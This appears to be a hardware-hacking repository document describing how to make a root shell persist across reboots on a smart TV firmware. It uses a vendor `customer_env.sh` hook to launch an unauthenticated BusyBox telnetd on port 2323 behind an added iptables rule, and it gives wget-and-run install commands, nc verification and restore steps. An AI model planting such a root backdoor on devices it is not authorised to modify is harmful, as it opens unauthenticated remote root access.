# Persistence via `customer_env.sh`

Status: **VERIFIED on hardware** on the documented target (root survived a cold
boot with the USB stick removed). The redacted capture is in
[evidence/persistence/output.txt](../../evidence/persistence/output.txt).

> **Firmware variants.** On at least one later `TPN256E` build
> (`TPN256E_V056.010.032.001`), `run.sh` does not reference
> `customer_env.sh`. Check before installing:
>
> ```sh
> grep -n customer_env.sh /mtd_apexe/board/run.sh
> ```
>
> If that prints nothing, `run.sh` will never source the file. Use the
> [`/swdl/telnet/telnetd` fallback](24-swdl-telnet-persistence-2026-11-11.md)
> instead. `payloads/persist_root.sh` now detects the hook and installs the
> matching one automatically. The report is external; see the variant note for
> the target and status.

## Why this hook exists

`/mtd_apexe/board/run.sh` sources a customer environment file on every boot:

```sh
if [ -e "/mtd_apdat/customer_env.sh" ]; then
    source /mtd_apdat/customer_env.sh
    if [ "${CUSTOMER_BRAND_NAME}" != "" ]; then
        export NF_MODEL_NAME="${CUSTOMER_BRAND_NAME}_${CUSTOMER_MARKET_MODEL}"
    fi
fi
```

`/mtd_apdat` is a symlink to `/mtd_rwarea/apdat`, which is a **rw ext4**
partition (p31). This is a legitimate vendor hook for customer branding; it is
also a persistent root hook.

## The ordering trap

`run.sh` sources `customer_env.sh` **before** it launches
`iptables_conf.sh` (the boot firewall). If you insert the `:2323` rule directly
in `customer_env.sh`, the later firewall flush removes it. The persistent
payload therefore starts a background script that:

1. waits for `/tmp/ntkdriver_completed` (the marker `quick_debug/menu` also
   waits for), with a 60-second cap;
2. waits another 5 seconds so `iptables_conf.sh` has finished flushing INPUT;
3. copies `/mtd_rwarea/apdat/busybox` to `/tmp/persist/busybox` (the basename
   must remain `busybox`);
4. inserts the `:2323` ACCEPT rule with `iptables -w 5`;
5. starts `telnetd` from `/tmp/persist/busybox` if the port is not already
   listening;
6. writes `/mtd_rwarea/apdat/root_boot.ready` on success.

`/tmp/persist/busybox` is deliberately separate from `/tmp/busybox`, so a USB
autorun stick left in the TV cannot overwrite the running persistent binary.

## Files

| Path | Purpose |
| :--- | :--- |
| `/mtd_rwarea/apdat/busybox` | Static armhf BusyBox, copied from the autoroot session. |
| `/mtd_rwarea/apdat/root_boot.sh` | Boot script. |
| `/mtd_rwarea/apdat/customer_env.sh` | Vendor hook; contains one appended line. |
| `/mtd_rwarea/apdat/root_boot.log` | Boot log. |
| `/mtd_rwarea/apdat/root_boot.ready` | Success marker with date/uptime. |
| `/mtd_rwarea/apdat/root_boot.ready.failed` | Failure marker. |

`payloads/persist_root.sh` installs all of it and runs `restorecon` on the three
files so they keep the `idtv_data_t` label.

## Install

From the USB autoroot root shell:

```sh
# Serve the repo from your workstation:
#   python3 -m http.server 8000 --bind 0.0.0.0
/tmp/busybox wget -O /tmp/persist_root.sh http://<WORKSTATION_IP>:8000/payloads/persist_root.sh
/bin/sh /tmp/persist_root.sh
```

The installer:

- refuses to run unless it is root and `/mtd_rwarea/apdat` is writable;
- detects whether `run.sh` sources `customer_env.sh`, or whether the firmware
  has the `/swdl/telnet/telnetd` seam;
- copies the running `/tmp/busybox` to `apdat/busybox`;
- writes `root_boot.sh`;
- on the `customer_env.sh` path, backs up an existing file to
  `customer_env.sh.bak` and appends the hook only if it is not already present;
- on the `/swdl` path, writes the wrapper and backs up any existing file to
  `/swdl/telnet/telnetd.bak`;
- prints the resulting files and the test commands.

## Verify without rebooting

```sh
/bin/sh /mtd_rwarea/apdat/root_boot.sh
cat /mtd_rwarea/apdat/root_boot.log
cat /mtd_rwarea/apdat/root_boot.ready
```

Because a telnetd is already listening from the USB session, the script should
print `port 2323 already listening` and still write `READY`. The important test
is the cold boot:

1. Remove the USB stick.
2. Unplug AC for 10 seconds.
3. Plug in, wait ~20 seconds.
4. `nc <TV_IP> 2323`, then `id`.

## Restore

```sh
# customer_env.sh variant:
sed -i '/root_boot.sh/d' /mtd_rwarea/apdat/customer_env.sh

# /swdl/telnet/telnetd variant:
rm -f /swdl/telnet/telnetd

rm -f /mtd_rwarea/apdat/root_boot.sh /mtd_rwarea/apdat/busybox \
      /mtd_rwarea/apdat/root_boot.log /mtd_rwarea/apdat/root_boot.ready \
      /mtd_rwarea/apdat/root_boot.ready.failed
```

Cold boot afterwards. If the hook breaks and you lose the shell, the USB
autoroot stick is the recovery path. See the
[`/swdl` variant restore notes](24-swdl-telnet-persistence-2026-11-11.md#restore)
for the `.bak` case.

## Why not modify the rootfs?

`/` is a read-only SquashFS. Modifying it would require repacking the `NFSB`
secure filesystem and dealing with the RSA/SHA-256 layer. The `apdat` hook is
smaller, reversible, and does not touch the boot chain. See
[ADR-0003](../adr/0003-persistence-via-customer-env.md).
